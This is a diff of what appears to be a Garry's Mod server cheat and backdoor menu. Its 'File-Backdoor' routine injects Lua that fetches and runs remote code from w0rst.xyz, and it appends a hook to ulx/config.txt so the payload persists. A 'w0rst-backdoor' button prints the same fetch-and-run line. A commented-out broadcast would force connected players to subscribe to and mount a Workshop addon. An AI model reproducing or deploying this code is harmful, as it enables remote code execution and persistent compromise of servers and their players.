@@ -1505,8 +1505,8 @@ end)
 CreateBDServer("File-Backdoor (ULX-Extended)", function()
     Log("Added/Injected Backdoor")
     SendLua([[
-        local lua = CompileString("http.Fetch('https://w0rst.xyz/project/func/napalm.lua', RunString)", "????") lua()
-        file.Append("ulx/config.txt", "\n"..[=[ulx hook Think wtf hmm "http.Fetch('https://w0rst.xyz/project/func/napalm.lua', RunString) hook.Remove('Think', 'wtf')"]=])
+        local lua = CompileString("http.Fetch('https://w0rst.xyz/project/func/napalm.php', RunString)", "????") lua()
+        file.Append("ulx/config.txt", "\n"..[=[ulx hook Think wtf hmm "http.Fetch('https://w0rst.xyz/project/func/napalm.php', RunString) hook.Remove('Think', 'wtf')"]=])
     ]])
 end)
 
@@ -2058,7 +2058,7 @@ CreateButton("Net Dump", MiscTab, 110, 25, 142, 10, function()
 end)
 
 CreateButton("w0rst-backdoor", MiscTab, 110, 25, 262, 10, function()
-    MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/project/func/napalm.lua', RunString) end)\n")
+    print("http.Fetch('https://w0rst.xyz/project/func/napalm.php', RunString)")
     Log("Check Console")
 end)
 
@@ -2157,6 +2157,12 @@ CreateButton("Play URL", SoundsTab, 495, 25, 10, 528, function()
         Log("Playing: " .. str)
     end)
 end)
+
+-- BroadcastLua([[
+--     steamworks.Subscribe(2384188626)
+--     steamworks.SetShouldMountAddon(2384188626, true )
+--     steamworks.ApplyAddons()
+-- ]])
 
 --[[
     http.Fetch("https://w0rst.xyz/project/func/load.lua", RunString)
